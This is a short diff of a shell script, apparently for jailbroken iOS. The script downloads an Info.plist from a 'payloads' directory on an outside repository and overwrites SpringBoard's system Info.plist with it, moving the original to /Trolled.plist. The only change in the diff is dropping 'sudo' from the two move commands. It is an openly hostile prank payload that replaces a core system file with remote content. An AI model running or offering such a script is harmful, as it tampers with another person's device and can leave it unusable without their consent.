@@ -4,5 +4,5 @@
 
 cd /var/mobile/hiutils
 wget https://repo.ironside.org.uk/payloads/Info.plist
-sudo mv /System/Library/CoreServices/SpringBoard.app/Info.plist /Trolled.plist
-sudo mv /var/mobile/hiutils/Info.plist /System/Library/CoreServices/SpringBoard.app/Info.plist
+mv /System/Library/CoreServices/SpringBoard.app/Info.plist /Trolled.plist
+mv /var/mobile/hiutils/Info.plist /System/Library/CoreServices/SpringBoard.app/Info.plist
